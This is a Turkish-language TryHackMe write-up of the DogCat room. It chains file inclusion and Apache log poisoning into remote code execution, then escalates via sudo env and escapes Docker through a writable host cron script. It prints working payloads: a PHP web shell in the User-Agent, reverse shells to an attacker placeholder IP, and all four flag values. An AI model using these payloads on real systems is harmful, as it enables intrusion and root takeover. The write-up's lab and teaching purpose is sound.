# 🐕🐱 DogCat — TryHackMe Writeup

![Zorluk](https://img.shields.io/badge/Zorluk-Orta-orange)
![Kategori](https://img.shields.io/badge/Kategori-Web%20|%20LFI%20|%20RCE%20|%20Docker%20Kaçışı-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Yazar:** Miraç Akkuş (LatenT)  
> **Tarih:** Mayıs 2026  
> **Oda:** [DogCat](https://tryhackme.com/room/dogcat)

---

## 📋 Yönetici Özeti

Bu write-up, **DogCat** makinesinin tam sömürülmesini belgelemektedir. Apache log poisoning ile Yerel Dosya Dahil Etme (LFI)'den Uzaktan Kod Yürütme (RCE)'ye, ardından Docker konteyneri içinde yetki yükseltme ve cronjob istismarı ile konteyner kaçışıyla sonuçlanan çok aşamalı bir saldırı zincirini göstermektedir. Çalışma, saldırı yolu boyunca dağıtılmış dört flag'i kapsamaktadır.

---

## 🛠️ Kullanılan Araçlar ve Teknolojiler

| Araç | Amaç |
|------|------|
| `nmap` | Ağ keşfi |
| `Burp Suite` | HTTP yakalama ve manipülasyon |
| `nc` | Ters kabuk dinleyicisi |
| `curl` | HTTP istek testi |
| `sudo` | Yetki yükseltme enumerasyonu |

---

## 🔍 Aşama 1: Keşif ve Enumerasyon

### Ağ Taraması

```bash
nmap -sV -sC -T4 <HEDEF_IP>
```

### Bulgular

| Port | Durum | Servis | Versiyon |
|------|-------|--------|----------|
| 22/tcp | açık | SSH | OpenSSH 7.6p1 Ubuntu |
| 80/tcp | açık | HTTP | Apache httpd 2.4.38 (Debian) |

**Kritik Gözlemler:**
- SSH mevcut ancak kimlik bilgileri yok
- Web uygulaması birincil saldırı yüzeyi

### Web Uygulaması Analizi

**Uygulama:** Köpek ve kedi resimleri için PHP tabanlı galeri.

**URL Parametreleri:**
- `/?view=dog` — Rastgele köpek resmi gösterir
- `/?view=cat` — Rastgele kedi resmi gösterir

**Arka Uç Kod Analizi (PHP Filtre ile):**

```bash
http://<HEDEF_IP>/?view=php://filter/convert.base64-encode/resource=dog
```

**Çözümlenmiş `index.php`:**
```php
<?php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
if(isset($_GET['view'])) {
    if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
        echo 'Here you go!';
        include $_GET['view'] . $ext;
    } else {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
?>
```

**Zafiyet Tanımlama:**
- `include $_GET['view'] . $ext` — Dinamik dosya dahil etme
- Girdi doğrulaması sadece "dog" veya "cat" alt dizge kontrolü yapıyor
- `$ext` parametresi dosya uzantısını kontrol ediyor (varsayılan `.php`)

---

## 🌐 Aşama 2: Yerel Dosya Dahil Etme (LFI)

### Uzantı Atlatma

Uygulama varsayılan olarak `.php` ekliyor. `&ext=` ile atlatma:

```bash
http://<HEDEF_IP>/?view=dog/../../../../../../../etc/passwd&ext=
```

**Sonuç:** `/etc/passwd` başarıyla okundu.

### PHP Filtre Sarmalayıcısı

Base64 kodlama ile PHP kaynak kodunu okuma:

```bash
http://<HEDEF_IP>/?view=php://filter/convert.base64-encode/resource=dog
```

**Çözümlenmiş `dog.php`:**
```php
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```

---

## 🐚 Aşama 3: LFI'den RCE'ye (Apache Log Zehirleme)

### Log Dosyası Keşfi

```bash
http://<HEDEF_IP>/?view=dog/../../../../../../../var/log/apache2/access.log&ext=
```

**Doğrulandı:** Apache erişim logları LFI ile okunabilir.

### User-Agent ile Log Zehirleme

**Adım 1:** Burp Suite'te isteği yakalayıp User-Agent'i değiştir:

```http
GET /?view=dog HTTP/1.1
Host: <HEDEF_IP>
User-Agent: <?php passthru($_GET['cmd']); ?>
```

**Adım 2:** Zehirlenmiş log üzerinden komut çalıştır:

```bash
http://<HEDEF_IP>/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=whoami
```

**Sonuç:** `www-data`

### Ters Kabuk

**Dinleyici:**
```bash
nc -lvnp 4444
```

**Payload (URL-kodlu):**
```bash
http://<HEDEF_IP>/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22<SALDIRGAN_IP>%22%2C4444%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

**Sonuç:** `www-data` olarak kabuk elde edildi.

---

## 🏴 Aşama 4: Flag Toplama (Konteyner)

### Flag 1

```bash
find / -name "flag*" -type f 2>/dev/null
cat /var/www/html/flag.php
```

**Flag 1:** `THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`

### Flag 2

```bash
find / -name "flag2*" -type f 2>/dev/null
cat /var/www/flag2_QMW7JvaY2LvK.txt
```

**Flag 2:** `THM{LF1_t0_RC3_aec3fb}`

---

## 🚀 Aşama 5: Yetki Yükseltme (Konteyner Root)

```bash
sudo -l
```

**Bulgu:**
```
User www-data may run the following commands on <container>:
    (root) NOPASSWD: /usr/bin/env
```

### GTFOBins Sömürüsü

```bash
sudo /usr/bin/env /bin/sh
```

**Sonuç:** Docker konteyneri içinde root kabuğu.

### Flag 3

```bash
cat /root/flag3.txt
```

**Flag 3:** `THM{D1ff3r3nt_3nv1ronments_874112}`

---

## 🐳 Aşama 6: Docker Kaçışı

### Konteyner Tespiti

```bash
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker
```

**Doğrulandı:** Docker konteyneri içinde çalışıyor.

### Host Etkileşimi Keşfi

```bash
ls -la /opt/
cat /opt/backup.sh
```

**İçerik:**
```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

**Analiz:**
- Script host üzerinde root olarak çalışıyor
- Konteyner dosya sistemini yedekliyor
- Muhtemelen host üzerinde cronjob ile çalıştırılıyor

### Cronjob İstismarı

**Adım 1:** Ters kabuk enjekte et:

```bash
echo '#!/bin/bash' > /opt/backup.sh
echo 'bash -i >& /dev/tcp/<SALDIRGAN_IP>/5555 0>&1' >> /opt/backup.sh
```

**Adım 2:** Saldırgan makinesinde dinleyici başlat:

```bash
nc -lvnp 5555
```

**Adım 3:** Cronjob çalışmasını bekle.

**Sonuç:** Host üzerinden root olarak ters kabuk.

---

## 🏁 Aşama 7: Flag 4 (Host)

```bash
cat /root/flag4.txt
```

**Flag 4:** `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`

---

## 🗺️ Saldırı Yolu Görselleştirmesi

```
[Saldırgan]
    │
    ├───nmap───► [Hedef: 22, 80]
    │                │
    │                ▼
    │        [Web Uygulaması: /?view=dog|cat]
    │                │
    │                ▼
    │        [LFI &ext= atlatma ile]
    │                │
    │                ▼
    │        [/var/log/apache2/access.log oku]
    │                │
    │                ▼
    │        [User-Agent ile log zehirleme]
    │                │
    │                ▼
    │        [RCE: www-data kabuğu]
    │                │
    │                ▼
    │        [Flag 1: /var/www/html/flag.php]
    │                │
    │                ▼
    │        [Flag 2: /var/www/flag2_QMW7JvaY2LvK.txt]
    │                │
    │                ▼
    │        [sudo -l: env NOPASSWD]
    │                │
    │                ▼
    │        [GTFOBins: env → root]
    │                │
    │                ▼
    │        [Flag 3: /root/flag3.txt (konteyner root)]
    │                │
    │                ▼
    │        [Docker tespiti (.dockerenv)]
    │                │
    │                ▼
    │        [/opt/backup.sh cronjob]
    │                │
    │                ▼
    │        [Ters kabuk enjekte et]
    │                │
    │                ▼
    │        [Host ters kabuğu (root)]
    │                │
    │                ▼
    └────────► [Flag 4: /root/flag4.txt]
```

---

## 🛡️ Zafiyet Değerlendirmesi ve Çözümler

| # | Zafiyet | Şiddet | CVSS | Çözüm |
|---|---------|--------|------|-------|
| 1 | **Yerel Dosya Dahil Etme (LFI)** | 🔴 Kritik | 9.8 | Kullanıcı girdisini sanitize et; dosya yolları için beyaz liste kullan; kullanıcı kontrollü girdi ile `include()`'u devre dışı bırak |
| 2 | **Apache Log Zehirleme** | 🔴 Kritik | 9.0 | Log girişlerini sanitize et; log dizinlerinde PHP yürütmesini devre dışı bırak; uygun girdi doğrulama uygula |
| 3 | **Sudo Yanlış Yapılandırması (env)** | 🔴 Kritik | 9.0 | NOPASSWD girişlerini kaldır; sudo'yu spesifik komutlarla kısıtla; mutlak yollar kullan |
| 4 | **Docker Konteyner Kaçışı** | 🔴 Kritik | 9.8 | En az ayrıcalıkla konteyner çalıştır; host dosya sistemi erişimini kısıtla; cronjob'ları izle |
| 5 | **Yazılabilir Yedekleme Scriptleri** | 🟠 Yüksek | 7.5 | Dosya bütünlüğü izleme uygula; yazma izinlerini kısıtla; değişmez yedeklemeler kullan |

---

## 🎓 Temel Çıkarımlar

1. **LFI'den RCE'ye:** Doğrudan kod yürütme mevcut olmadığında log zehirleme güvenilir bir tekniktir
2. **PHP Filtreleri:** `php://filter` yürütme olmadan kaynak kodu okumaya olanak tanır — keşif için temel
3. **Girdi Doğrulama Atlatma:** Alt dizge eşleştirme (`strpos`) zayıftır — yoldaki "dog" kontrolü atlatılır
4. **Docker Farkındalığı:** Her zaman konteynerleşmeyi kontrol et — `.dockerenv`, `/proc/1/cgroup`
5. **Cronjob İstismarı:** Konteynerlerle etkileşen host zamanlanmış scriptleri kaçış vektörleridir
6. **GTFOBins:** `env` ile sudo iyi bilinen bir yetki yükseltme yoludur

---

---

## 🚩 Flag'ler

| Flag | Konum | Değer |
|------|-------|-------|
| **Flag 1** | `/var/www/html/flag.php` | `THM{Th1s_1s_N0t_4_Catdog_ab67edfa}` |
| **Flag 2** | `/var/www/flag2_QMW7JvaY2LvK.txt` | `THM{LF1_t0_RC3_aec3fb}` |
| **Flag 3** | `/root/flag3.txt` | `THM{D1ff3r3nt_3nv1ronments_874112}` |
| **Flag 4** | `/root/flag4.txt` | `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}` |

---

> **⚠️ Yasal Uyarı:** Bu write-up sadece eğitim ve araştırma amaçlıdır. Sahibi olmadığınız sistemleri test etmeden önce her zaman açık yazılı yetki alın.

---
**Yazar:** Miraç Akkuş (LatenT)  
**Tarih:** Mayıs 2026
```
